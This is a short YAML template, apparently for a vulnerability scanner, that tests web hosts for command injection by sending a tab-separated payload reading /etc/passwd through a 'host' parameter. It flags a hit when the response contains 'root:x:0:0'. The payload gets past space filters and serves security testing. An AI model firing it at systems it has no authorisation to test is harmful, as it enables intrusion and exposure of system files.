id: patt-cmdi-nospace-02-host
name: 'PATT cmdi patt-cmdi-nospace-02 via host'
severity: critical
type: active
tags:
  - cmdi
  - patt
  - filterspace
description: 'PATT Bypass Without Space: TAB %09. [patt:patt-cmdi-nospace-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      host:
        - '%09cat%09/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
